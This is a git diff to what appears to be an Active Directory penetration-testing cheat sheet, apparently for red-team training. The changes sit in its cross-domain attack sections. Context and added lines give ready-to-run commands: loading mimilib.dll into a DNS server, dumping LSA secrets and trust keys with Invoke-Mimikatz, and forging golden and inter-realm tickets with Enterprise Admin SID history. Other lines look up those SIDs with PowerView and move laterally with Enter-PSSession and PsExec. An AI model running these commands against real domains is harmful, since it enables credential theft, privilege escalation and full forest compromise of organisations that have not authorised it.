@@ -361,6 +361,7 @@ Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
 Sc \\<dns server> stop dns
 Sc \\<dns server> start dns
 ```
+
 ## Cross Domain attacks
 ### MS Exchange2
 ![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)
@@ -438,6 +439,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 #### Create an inter-realm TGT
 - Uses well know Enterprise Admins SIDS
+- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | select samaccountname, objectsid```
 ```
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
 ```
@@ -461,9 +463,11 @@ tgs::ask /tgt:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC>
 misc::convert lsa <KIRBI FILE>
 ```
 
-#### Use service, for example CIFS:
+#### Check access to server
 ```
 dir \\<FQDN PARENT DC>\C$ 
+Enter-PSSession <COMPUTERNAME>
+.\PsExec64.exe \\<COMPUTERNAME> cmd
 ```
 
 ### Krbtgt hash
@@ -475,6 +479,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
 
 #### Create TGT and inject in current session
 - The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
+- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | select samaccountname, objectsid```
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
 ```
